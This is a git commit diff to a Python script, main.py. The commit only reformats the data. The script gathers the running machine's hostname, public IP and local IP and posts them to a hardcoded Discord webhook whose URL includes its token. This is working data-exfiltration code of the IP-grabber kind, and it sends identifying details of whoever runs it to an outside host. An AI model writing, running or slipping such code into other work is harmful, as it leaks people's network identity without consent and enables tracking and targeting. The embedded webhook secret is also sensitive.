f8a2ad168af7996d2a2ced91b8327aa906763589
Eletroman179 <jameschaowadee@gmail.com>
2026-03-18 10:59:47 +0700

    Change content formatting to use json.dumps
    Updated the webhook request to use json.dumps for content formatting.

--- main.py
+++ main.py
@@ -1,16 +1,17 @@
 import requests
 import socket
+import json
 
 def ip():
     host = socket.gethostname()
     return socket.gethostbyname(host)
 
 requests.post("https://discord.com/api/webhooks/1483326994253873216/o21iquTxU4nb_YQzQVPh3iemcMLjj-NiqHQwCW_YUktTf3EUVhCnUiX2hRk4vLlaTZnp", {
-    "content": str(
+    "content": json.dumps(
         {
             "hostname": socket.gethostname(),
             "ipA": requests.get("https://api.ipify.org").text,
             "ipB": ip()
-        }
-    )
+        },
+    indent=4)
 })
